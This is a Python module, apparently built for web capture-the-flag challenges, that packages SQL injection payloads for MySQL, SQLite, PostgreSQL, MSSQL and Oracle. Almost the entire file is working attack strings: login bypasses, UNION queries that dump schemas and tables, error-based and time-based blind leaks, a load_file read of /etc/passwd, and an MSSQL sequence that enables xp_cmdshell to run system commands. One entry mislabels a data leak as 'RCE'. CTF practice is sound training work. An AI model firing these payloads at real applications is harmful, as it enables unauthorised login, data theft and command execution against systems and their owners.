"""
SQL Injection Payloads & DBMS Cheatsheet Module for Web CTF challenges.
Covers MySQL, SQLite, PostgreSQL, MSSQL, Oracle, Auth Bypasses and Error-based vectors.
"""

from typing import List, Dict

AUTH_BYPASSES = [
    {"name": "Standard OR 1=1", "payload": "' OR 1=1-- -", "desc": "Classic single-quote auth bypass with dash comment."},
    {"name": "Double Quote OR 1=1", "payload": "\" OR 1=1-- -", "desc": "Double quote string termination bypass."},
    {"name": "Admin Comment Bypass", "payload": "admin'-- -", "desc": "Logs in as admin by commenting out password check."},
    {"name": "Admin Hash Bypass", "payload": "admin'#", "desc": "MySQL hash comment auth bypass."},
    {"name": "OR Always True (No Spaces)", "payload": "'or'1'='1", "desc": "Space-less string comparison auth bypass."},
    {"name": "Inline Comment Bypass", "payload": "'/**/OR/**/1=1/**/--/**/-", "desc": "Bypasses space filters using C-style comments."},
    {"name": "Boolean True with Parentheses", "payload": "') OR (1=1)-- -", "desc": "Bypasses nested parentheses query checks."},
    {"name": "Union Mock Admin Bypass", "payload": "' UNION SELECT 1,'admin','5f4dcc3b5aa765d61d8327deb882cf99'-- -", "desc": "Mocks valid admin row with known MD5 hash (password)."},
]

def get_mysql_payloads() -> List[Dict[str, str]]:
    """Retrieve MySQL / MariaDB specific payloads."""
    return [
        {
            "name": "Version & User Probe",
            "payload": "' UNION SELECT 1, @@version, user(), database()-- -",
            "desc": "Fetch database version, current user, and active schema."
        },
        {
            "name": "Extract All Table Names",
            "payload": "' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()-- -",
            "desc": "Dump all table names in current database using group_concat."
        },
        {
            "name": "Extract Column Names of Table",
            "payload": "' UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name='flag'-- -",
            "desc": "Dump column names from target table."
        },
        {
            "name": "Error-based ExtractValue RCE/Data Leak",
            "payload": "' AND extractvalue(1, concat(0x7e, (SELECT database()), 0x7e))-- -",
            "desc": "Error-based exfiltration via XPath ExtractValue function."
        },
        {
            "name": "Error-based UpdateXML Leak",
            "payload": "' AND updatexml(1, concat(0x7e, (SELECT @@version), 0x7e), 1)-- -",
            "desc": "Error-based exfiltration via UpdateXML."
        },
        {
            "name": "Time-based Blind Delay (Sleep)",
            "payload": "' OR (SELECT IF(1=1, sleep(5), 0))-- -",
            "desc": "Inject 5-second sleep when condition is true."
        },
        {
            "name": "File Read (load_file)",
            "payload": "' UNION SELECT 1, load_file('/etc/passwd'), 3-- -",
            "desc": "Read local system files if FILE privilege enabled."
        }
    ]

def get_sqlite_payloads() -> List[Dict[str, str]]:
    """Retrieve SQLite specific payloads."""
    return [
        {
            "name": "SQLite Version Probe",
            "payload": "' UNION SELECT 1, sqlite_version(), 3--",
            "desc": "Fetch SQLite engine version."
        },
        {
            "name": "Extract Table Names (sqlite_master)",
            "payload": "' UNION SELECT 1, group_concat(tbl_name), 3 FROM sqlite_master WHERE type='table'--",
            "desc": "Dump all tables in SQLite database."
        },
        {
            "name": "Extract Table Creation SQL (Schema)",
            "payload": "' UNION SELECT 1, sql, 3 FROM sqlite_master WHERE type='table'--",
            "desc": "Dump entire database schema including table column names and structures."
        },
        {
            "name": "Boolean Blind Substring Test",
            "payload": "' AND (SELECT substr(tbl_name,1,1) FROM sqlite_master WHERE type='table' LIMIT 1)='f'--",
            "desc": "Boolean blind char-by-char extraction in SQLite."
        }
    ]

def get_postgres_payloads() -> List[Dict[str, str]]:
    """Retrieve PostgreSQL specific payloads."""
    return [
        {
            "name": "Postgres Version & User",
            "payload": "' UNION SELECT 1, version(), current_user, current_database()--",
            "desc": "Fetch PostgreSQL version, active user, and database name."
        },
        {
            "name": "Extract Table Names",
            "payload": "' UNION SELECT 1, string_agg(tablename, ','), 3 FROM pg_tables WHERE schemaname='public'--",
            "desc": "Dump tables in public schema using string_agg."
        },
        {
            "name": "Time-based Blind (pg_sleep)",
            "payload": "'; SELECT pg_sleep(5);--",
            "desc": "PostgreSQL time delay execution."
        },
        {
            "name": "Error-based Data Leak (CAST)",
            "payload": "' AND 1=CAST((SELECT current_database()) AS int)--",
            "desc": "Forces type cast error disclosing query result in error message."
        }
    ]

def get_mssql_payloads() -> List[Dict[str, str]]:
    """Retrieve Microsoft SQL Server (MSSQL) payloads."""
    return [
        {
            "name": "MSSQL Version Probe",
            "payload": "' UNION SELECT 1, @@version, db_name()--",
            "desc": "Fetch MSSQL server version and database name."
        },
        {
            "name": "Time-based Blind Delay (WAITFOR)",
            "payload": "'; WAITFOR DELAY '0:0:5';--",
            "desc": "Pause execution for 5 seconds."
        },
        {
            "name": "Error-based Data Leak (CONVERT)",
            "payload": "' AND 1=CONVERT(int, (SELECT @@version))--",
            "desc": "Forces integer conversion error displaying string value."
        },
        {
            "name": "Command Execution (xp_cmdshell)",
            "payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';--",
            "desc": "Enable xp_cmdshell and execute system commands."
        }
    ]

def get_oracle_payloads() -> List[Dict[str, str]]:
    """Retrieve Oracle DBMS specific payloads."""
    return [
        {
            "name": "Oracle Version Probe",
            "payload": "' UNION SELECT banner, null FROM v$version--",
            "desc": "Fetch Oracle banner version (requires dual/table matching columns)."
        },
        {
            "name": "Extract Table Names (all_tables)",
            "payload": "' UNION SELECT table_name, null FROM all_tables--",
            "desc": "List accessible tables in Oracle."
        }
    ]
